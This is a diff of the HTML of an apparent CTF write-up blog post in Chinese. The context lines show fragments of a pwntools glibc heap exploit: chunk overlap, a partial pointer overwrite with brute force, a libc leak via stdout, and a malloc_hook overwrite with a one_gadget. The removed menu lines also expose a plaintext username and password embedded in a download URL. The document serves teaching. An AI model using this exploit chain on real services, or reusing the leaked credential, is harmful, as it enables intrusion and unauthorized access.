@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -343,7 +343,7 @@
 <h4 id="调试过程">调试过程</h4>
 <p>这里展示本地调试的过程，手动输入需要爆破的那个字节大小。</p>
 <p>首先准备好各个函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -374,11 +374,10 @@
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">:</span><span class="n">tube</span><span class="p">,</span> <span class="n">idx</span><span class="p">:</span><span class="nb">int</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice : &#34;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;game&#39;s index:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>分配两个<code>chunk</code>并释放，构造<code>overlapped chunk</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -391,22 +390,20 @@
 </span></span><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">14</span> <span class="o">*</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">))</span> <span class="c1"># 1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115211.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115211.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115211.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115211.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115211.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115211.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>修改低字节为<code>0x20</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x20</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1"># 2</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x20</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1"># 2</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115424.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115424.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115424.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115424.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115424.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115424.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>修改<code>chunk 0</code>的<code>size</code>域为<code>0x91</code>，得到<code>unsorted bin chunk</code>，并构造出<code>fastbin</code>与<code>unsorted bin</code>重合的堆布局，准备好<code>0x30</code>大小的<code>chunk</code>，避免切割<code>unsorted bin</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -429,12 +426,11 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span> <span class="c1"># 6</span>
 </span></span><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="s1">&#39;bbbb&#39;</span><span class="p">)</span> <span class="c1"># 7</span>
-</span></span><span class="line"><span class="cl"><span class="n">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115522.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115522.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115522.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115522.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115522.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115522.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>修改<code>chunk 0</code>的<code>size</code>为<code>0x71</code>，修改<code>fd</code>指针的低2个字节，释放掉好<code>0x30</code>大小的<code>chunk</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -449,8 +445,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="o">=</span> <span class="n">get</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xdd</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">get</span><span class="p">)</span> <span class="c1"># 8</span>
 </span></span><span class="line"><span class="cl"><span class="n">Delete</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;deadbeef&#39;</span><span class="p">)</span> <span class="c1"># 9</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;deadbeef&#39;</span><span class="p">)</span> <span class="c1"># 9</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>首先看要修改的那个<code>fake chunk</code>的地址：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115927.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115927.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115927.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115927.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115927.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405115927.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -459,7 +454,7 @@
 <p>这里我们输入<code>0x75</code>就能分配到这个<code>fake chunk</code>处。</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120532.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120532.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120532.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120532.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120532.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120532.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>分配到<code>stdout</code>结构体上方，泄露出<code>libc</code>地址：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -486,12 +481,11 @@
 </span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s1">&#39;leak_libc_addr&#39;</span><span class="p">,</span> <span class="n">leak_libc_addr</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">leak_libc_addr</span> <span class="o">-</span>  <span class="mh">0x3c56a3</span>
-</span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s1">&#39;libc_base_addr&#39;</span><span class="p">,</span> <span class="n">libc_base_addr</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s1">&#39;libc_base_addr&#39;</span><span class="p">,</span> <span class="n">libc_base_addr</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120723.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120723.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120723.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120723.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120723.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120723.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>再次分配到<code>malloc_hook</code>，并利用<code>realloc</code>调整栈帧，这里选则的偏移是<code>0xd</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -536,15 +530,14 @@
 </span></span><span class="line"><span class="cl"><span class="n">Add</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xb</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">realloc_offset</span> <span class="o">+</span> <span class="mh">0xd</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s1">&#39;one_gadget addr&#39;</span><span class="p">,</span> <span class="n">one_gadget</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice : &#34;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice : &#34;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120901.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120901.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120901.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120901.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120901.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405120901.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121007.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121007.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121007.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121007.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121007.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121007.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121052.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121052.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121052.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121052.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121052.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405121052.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h4 id="完整exp">完整exp</h4>
 <p>完整的<code>exp</code>是需要爆破的：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -771,8 +764,7 @@
 </span></span><span class="line"><span class="cl">            <span class="n">r_gadget</span> <span class="o">=</span> <span class="mh">0x4526a</span>
 </span></span><span class="line"><span class="cl">            <span class="n">attack</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="mh">0x3c4b10</span><span class="p">,</span> <span class="n">r_gadget</span><span class="p">,</span> <span class="n">r_realloc</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>爆破的效果如图：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405122710.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405122710.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405122710.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405122710.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405122710.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210405122710.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
